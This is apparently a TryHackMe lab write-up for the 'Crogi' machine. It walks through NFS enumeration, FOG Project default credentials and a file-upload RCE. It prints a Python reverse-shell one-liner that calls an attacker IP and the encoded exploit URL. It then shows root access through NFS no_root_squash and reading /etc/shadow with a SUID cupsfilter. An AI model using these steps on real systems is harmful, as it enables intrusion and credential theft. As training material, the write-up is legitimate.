# TryHackMe-Crogi

## NMAP

```bash
          
21/tcp    open  ftp       syn-ack ttl 63 vsftpd 3.0.3
22/tcp    open  ssh       syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                            
80/tcp    open  http      syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:                                                           
|_  Supported Methods: GET POST OPTIONS HEAD                              
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
111/tcp   open  rpcbind   syn-ack ttl 63 2-4 (RPC #100000)
443/tcp   open  ssl/https syn-ack ttl 63 Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2049/tcp  open  nfs_acl   syn-ack ttl 63 3 (RPC #100227)
3306/tcp  open  mysql     syn-ack ttl 63 MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 89
|   Capabilities flags: 63487
|   Some Capabilities: InteractiveClient, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, Support41Auth, Speaks41ProtocolOld, SupportsTransaction
s, LongPassword, SupportsLoadDataLocal, IgnoreSigpipes, ODBCClient, DontAllowDatabaseTableColumn, FoundRows, SupportsCompression, Speaks41ProtocolNe
w, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: ;sV4=wbeUX:W*gL$m{Bs
|_  Auth Plugin Name: mysql_native_password
42493/tcp open  nlockmgr  syn-ack ttl 63 1-4 (RPC #100021)
57597/tcp open  mountd    syn-ack ttl 63 1-3 (RPC #100005)
58527/tcp open  mountd    syn-ack ttl 63 1-3 (RPC #100005)
60677/tcp open  mountd    syn-ack ttl 63 1-3 (RPC #100005)
   
```

## PORT 2049 (NFS)

Since `nfs` is enabled we can see if there's are share available for us to mount , and running `showmount` will show which shares are available

<img src="https://i.imgur.com/9kTfptS.png"/>

We can now mount this using the `mount` command

<img src="https://i.imgur.com/WAIUgL4.png"/>

If we navigate into folders we can see a `fog` file  and we can see that there's something called fog project

<img src="https://i.imgur.com/9iGzhtn.png"/>

<img src="https://imgur.com/xKcwqmK.png"./>

We can serch for default creds for fog which are `fog:password`

<img src="https://imgur.com/XxM9xcW.png"/>

<img src="https://imgur.com/kiywavz.png"/>

Searching for exploits on google we do find one for `File Upload RCE`

<img src="https://imgur.com/Q9KN2YA.png"/>


## Foothold 

So let's follow the steps to get remote code execution , first we need to create an empty file using the command show in the exploit

<img src="https://imgur.com/InaLuIt.png"/>

Make a variable named `cmd` which will save the value coming form the GET parameter named `cmd` and that command will be executed with `system` function , basically running any shell command

<img src="https://imgur.com/v42IydL.png"/>

Then we have to server this file by hosting it on our machine and we need to include that request (http://ip/myshell) in base64 encoded form in a GET parameter named `file` of fog url

```
http://10.10.39.253:443/fog/management/index.php?node=about&sub=kernel&file=aHR0cDovLzAuOC45NC42MC9teXNoZWxsCg==&arch=arm64
```

After making that request  a confirmation will be show to install the kernel module

<img src="https://imgur.com/AaGATcx.png"/>

Here we need to change kernel name from `bzImage32` to `myshell.php`

<img src="https://imgur.com/GYQJ9bj.png"/>

<img src="https://imgur.com/t6DEs45.png"/>

Navigating to  `/fog/service/ipxe/myshell.php?cmd=id`

<img src="https://imgur.com/J6FNVxu.png"/>

We will have rce from which we can get a revere shell 

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.94.60",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

<img src="https://imgur.com/KPrGBqV.png"/>

Stabilizing the shell

<img src="https://imgur.com/XgRM5CP.png"/>

## Rabbit hole

We can find fog database password from `/opt/fog/.fogsettings`

<img src="https://imgur.com/Srmyslw.png"/>

There's also another set of credentials but I am not sure for which service it's for but there is a usernamed `fogproject` so let's try for this user

<img src="https://imgur.com/U90J2JE.png"/>

<img src="https://imgur.com/F5uEh1C.png"/>

This indeed was the right password but it immediately shows a message and brings us back to www-data shell , but we can actually runs commands as this user through `su fogproject -c id`

<img src="https://imgur.com/t7sMM9B.png"/>

I tried to get sh shell instead of bash and it worked

<img src="https://imgur.com/YjYHXXn.png"/>

But I couldn't do much from this user , so I went on and looked at the kernel version

<img src="https://imgur.com/Xvkcobl.png"/>

Now at this point I am not gonna lie I got into a rabbit hole and tried to exploit the kernel version but couldn't get any of the exploits to work as all failed at finding subuid (don't know what it means )

<img src="https://imgur.com/kSC1TKI.png"/>

## Privilege Escalation (1st method)

I should have run `linpeas` from the start and it would have saved my time because as I ran linpeas and found that `no_squash_root` was enabled

<img src="https://imgur.com/hVrogB0.png"/>

And this could be a secrity issue , by default on nfs share ,it we mount the share and whatever changes that we make in that share like uploading files or writing files it will be owned as `nfsnobody` or `nobody` even tho we are root on our host machine but if no_root_squash is enabled , whatever changes we make or upload any files that will be owned as root on the actual target machine so we can mount the share , copy the `bash` from our machine and make it a SUID , and that file will also be shown as being SUID binary owned by root on the actual machine (target machine)

So in order to see which share we have write access , we can read the `/etc/exports` file on the target machine

<img src="https://imgur.com/Ftg7CaG.png"/>

Let's mount `/images/dev` share again

<img src="https://imgur.com/Ns6WtzN.png"/>

Here what I have done is , mounted the share and in that share created a c program file which will set the SUID to 0 (which is for root user) and spawn the bash shell . After compiling the file we have to make that binary a SUID because when this binary executes it will be executed as a root user

<img src="https://imgur.com/wDYyiGp.png"/>

<img src="https://imgur.com/pQCvQoi.png"/>

Also to note that I had tried copying the bash binary , making it a SUID and then executing it but it didn't work as it was throwing an error related loading shared library

<img src="https://imgur.com/wYnhIY9.png"/>

## Privilege Escalation (2nd method)

Checking the SUID binaries , we will find a binary named `cupsfilter`

<img src="https://imgur.com/7pzQoPT.png"/>

CUPS in linux is used as a printing service in linux for printing files and cupsfilter is used for converting a file to a specific format , after the file is converting it sends the output to standard output , on to the screen. So we can abuse this by going to GTFOBINS

<img src="https://imgur.com/n9bF12b.png"/>

Running `/usr/sbin/cupsfilter -i application/octet-stream -m application/octet-stream /etc/shadow`

<img src="https://imgur.com/4tPRSxY.png"/>

This will print the shadow file which holds all user's password hashses, in this way we can read the root flag as well but we won't get a shell through this method as we can only read files and since there's no ssh key in root user's .ssh directory we can't do much from here

## References

- https://www.exploit-db.com/exploits/49811
- https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
- https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
- https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/s2-server-nfs-noroot
- https://man7.org/linux/man-pages/man8/cupsfilter.8.html
- https://gtfobins.github.io/gtfobins/cupsfilter/